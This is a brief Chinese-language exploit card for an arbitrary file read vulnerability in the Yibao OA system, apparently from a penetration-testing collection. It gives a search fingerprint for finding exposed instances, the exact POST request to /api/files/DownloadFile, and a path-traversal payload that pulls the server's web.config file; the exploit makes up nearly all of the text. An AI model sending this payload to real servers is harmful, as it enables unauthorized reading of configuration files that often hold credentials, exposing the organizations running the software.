# 易宝OAdownloadfile任意文件读取漏洞

- **系统**：易宝OAdownloadfile　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /api/files/DownloadFile HTTP/1.1`
- **关键头**：`Content-Length: 94`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
token=zxh&requestFileName=../../manager/web.config&pathType=1&startPosition=0&bufferSize=1000

\[易宝OA-downloadfile-文件读取.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 易宝OA downloadfile 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易宝OA